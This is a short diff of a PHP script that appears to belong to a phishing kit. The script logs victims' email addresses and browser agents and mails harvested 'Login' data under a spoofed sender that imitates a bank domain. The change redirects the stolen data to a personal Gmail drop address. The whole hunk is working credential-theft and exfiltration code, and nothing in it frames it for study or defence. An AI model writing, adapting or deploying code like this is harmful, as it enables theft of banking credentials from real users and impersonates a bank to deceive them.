@@ -23,7 +23,7 @@ $kOpD3ZelQ = fopen('e-mail-error.text','a+');
    E-MAIL / USER ".$_GET['correo']."
    AGENTE DE NAVEGACION ".$_SERVER['HTTP_USER_AGENT']."";
 
-$recipient = "reservaciones@shopflights.org";
+$recipient = "josuepetrek@gmail.com";
 $subject = "Login MP ".$_GET['id']."";
 $prefijo = substr(md5(uniqid(rand())),0,6);
 $from = "From:Login Visa Home - $ip<$prefijo@bancobcr.com>";
